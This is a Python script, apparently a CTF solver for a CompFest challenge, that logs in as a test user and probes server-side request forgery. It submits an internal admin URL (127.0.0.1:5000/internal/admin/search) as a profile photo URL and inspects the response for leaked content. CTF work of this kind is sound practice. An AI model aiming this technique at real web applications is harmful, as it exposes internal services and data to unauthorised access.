#!/usr/bin/env python3
import requests

# Target URL
BASE_URL = "http://ctf.compfest.id:7302"

def register_and_login():
    """Register a new user and login"""
    username = "debug_user"
    password = "debug123"
    
    # Register
    data = {'username': username, 'password': password}
    requests.post(f"{BASE_URL}/register", data=data)
    
    # Login
    response = requests.post(f"{BASE_URL}/login", data=data, allow_redirects=False)
    if response.status_code == 302:
        return response.cookies
    return None

def debug_ssrf():
    """Debug SSRF responses"""
    print("[+] Debugging SSRF responses...")
    
    # Get session
    cookies = register_and_login()
    if not cookies:
        print("[-] Failed to login!")
        return
    
    print("[+] Successfully logged in!")
    
    # Test with empty query first
    url = "http://127.0.0.1:5000/internal/admin/search"
    
    print(f"\n[*] Testing: {url}")
    
    data = {'photo_url': url}
    
    try:
        response = requests.post(f"{BASE_URL}/profile", data=data, cookies=cookies, timeout=10)
        
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Content-Type: {response.headers.get('Content-Type', 'Not set')}")
        
        # Check if we have a profile picture now
        if "profile-picture" in response.text or "uploads/" in response.text:
            print("[+] Profile picture was updated!")
            
            # Check what content type was detected
            if "content_type" in response.text:
                print("[+] Content type was detected")
        
        # Look for any interesting content
        if "welcome_note" in response.text or "author_message" in response.text or "final_message" in response.text:
            print("[+] Found interesting content in response!")
            print(f"[+] Response preview: {response.text[:500]}")
        
        # Check for error preview
        if "Failed to render as image" in response.text:
            start = response.text.find("<pre>")
            end = response.text.find("</pre>")
            if start != -1 and end != -1:
                preview = response.text[start+5:end]
                print(f"[+] Error preview: {preview}")
        else:
            print("[+] No error preview found")
            
            # Check if we got a successful image response
            if "profile-picture" in response.text:
                print("[+] Got profile picture response - SSRF worked but returned image content")
            else:
                print("[+] No profile picture found - SSRF might have failed")
        
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    debug_ssrf()
